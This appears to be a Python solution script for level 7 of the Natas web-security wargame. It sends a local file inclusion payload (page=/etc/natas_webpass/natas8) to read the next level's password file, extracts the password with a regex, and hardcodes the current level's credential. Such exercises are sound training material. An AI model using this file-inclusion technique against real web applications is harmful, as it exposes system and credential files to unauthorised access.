# -*- coding: utf-8 -*-
from base import get_page
import re



def natas7():
    
    username = "natas7"
    password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
    content = get_page(7, username, password, "/index.php?page=/etc/natas_webpass/natas8")
    password = re.search(r"(?<=<br>\n)\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))


if __name__ == "__main__":
    natas7()